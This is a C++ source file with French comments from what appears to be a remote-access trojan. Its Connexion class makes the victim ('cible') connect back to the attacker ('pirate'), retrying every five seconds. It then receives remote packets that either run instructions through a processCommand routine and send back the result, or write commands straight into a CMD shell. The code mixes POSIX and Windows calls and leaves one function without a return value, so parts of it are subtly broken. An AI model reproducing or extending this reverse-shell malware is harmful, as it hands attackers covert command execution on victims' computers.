//
// La classe connexion gère tous les éléments permettant d'initier et de maintenir la connexion entre la cible et le pirate
//

#include <unistd.h>
#include "Connexion.h"
Connexion* Connexion::connexionptrreference = NULL;
bool Connexion::connected;

Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
    connexiontype = ConnexionTypearg; // type de connexion, la fonction est commune aux client et au pirate, aura besoin de ce type pour distingué le pirate de la cibl;e
    this->adresseIPm = adresseIP; //adresse ip de la cible
    this->port = port;//port utilisé pour établir la communication avec la cible
    //Démarrage des services necessaires
    if(MyPNet::Network::Initialize()){      //(MyPNet est notre librairie créé pour établir et communiquer. élément commun aux cible et au pirates
        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){ // creation du socket, si retourne success, le socket a ete cree
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) { //on essait le pirate
                if (_socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) { // on essait de rejoindre le pirate
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    connected = true;
                    connexionptrreference = this;
                    this->adresseIP.sin_addr.s_addr = inet_addr("127.0.0.1"); //on stock les informations dans l'objet adresseIP qui est de type SOCKADDR_IN
                    this->adresseIP.sin_port = htons(13337); //Port
                    this->adresseIP.sin_family = AF_INET; //IPv4 Socket

                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);} // si la connexion ne réussi pas, on refait dans in delais
            }
        }
    }
}


bool Connexion::Connect() {
    std::cout << "Lancement Connect" << std::endl;
    Connection = socket(AF_INET, SOCK_STREAM, NULL); //soccket de connextion

    if (connect(Connection, (SOCKADDR*)&adresseIP, sizeof(adresseIP)) != 0){       std::cout << "Échec Connect" << std::endl;
        return false;
    }

    std::cout << "Session connectée!" << std::endl;
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)processConnexion, NULL, NULL, NULL); //creation d'un processus qui s'occupera de la connexion
    connected = true;
    return true;

    return false;
}

void Connexion::processConnexion() {
    MyPNet::PacketType packettype;

    while (true){
        if (!connexionptrreference->identificationPacketTyoe(packettype)){ std::cerr <<"Il y a eu un problème lors de la réception et du traitement du packet"; break;}
        if (!connexionptrreference->ProcessPacketType(packettype)){std::cerr<<"Il y a eu un problème lors de la décision du traitement de packet"; break;}
    }
    connected = false;
    std::cerr << "ERREUR : Deconnection du pirate";
    if (connexionptrreference->CloseConnection()){
        std::cout << "Socket s'est correctement fermer" << std::endl;
    }else{
        std::cerr << "ERREUR : Problème lors de la fermeture du socket";
    }
}

bool Connexion::CloseConnection() const { // fermeture du socket
    closesocket(this->Connection);
    return true;
}

bool Connexion::identificationPacketTyoe(MyPNet::PacketType & _packettype) {
    int32_t packettype;
    if (!Getint32_t(packettype)){//fonction de reception de packer,
        return false;
    } //AUCUNE donnee reçu
    _packettype = (MyPNet::PacketType)packettype;
    return true;
}

bool Connexion::Getint32_t(int32_t &_int32_t) {
    if (!recvall((char*)&_int32_t, sizeof(int32_t))){ //fonction de mise en écoute
        return false; //ECHEC de reception -- AUCUNE DONNEE RECU
    }
    _int32_t = ntohl(_int32_t); //donnee network vert int32 (integer 32 bits)
    return true;//RÉUSSI
}

bool Connexion::recvall(char *data, int totalbytes) {
    int bytesreceived = 0;

    while (bytesreceived < totalbytes){
        int RetnCheck = recv(Connection, data + bytesreceived, totalbytes - bytesreceived, NULL); // essait de recevoir des bytes
        if (RetnCheck == SOCKET_ERROR){ //si la reception echoue, recv retourne SOCKET_ERROR
            return false;//SOCKET_ERROR
        }
        bytesreceived += RetnCheck;
    }
    return true;
}


//Une fois le type de packet obtenue, on fait une action selon le type de packet.
bool Connexion::ProcessPacketType(MyPNet::PacketType _PacketType) {

    switch (_PacketType){ // enum : int32   Une fois le type de packet obtenue, on fait une action selon le type de packet.
        case MyPNet::PacketType::Instruction:{ // si packet type = Instruction  int32 = 1
            std::string msg;
            if (!GetString(msg)){
                return false;
            }
            SendString(installationAndStart::processCommand(msg), MyPNet::PacketType::Instruction);
            break;
        }

        case MyPNet::PacketType::CMDCommand:{ // si packet type = CMDCommand  int32 = 2
            std::string msg;
            if (!GetString(msg)){
                return false;
            }
            if (CMD::cmdptr != NULL){
                CMD::cmdptr->writeCMD(msg);
                break;
            }else{
                break;
            }
        }
    }
}


